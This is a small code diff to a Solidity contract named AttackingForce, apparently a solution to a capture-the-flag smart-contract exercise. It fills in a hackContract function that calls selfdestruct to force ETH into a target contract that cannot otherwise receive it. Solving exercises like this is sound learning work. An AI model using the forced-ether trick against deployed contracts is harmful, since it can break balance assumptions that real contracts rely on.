@@ -10,6 +10,8 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        // Soon-to-be-deprecated `selfdestruct` forcefully passes ETH to any address
+        // Since this was deployed with a balance, simply selfdestruct and point to address
+        selfdestruct(payable(contractAddress));
     }
 }
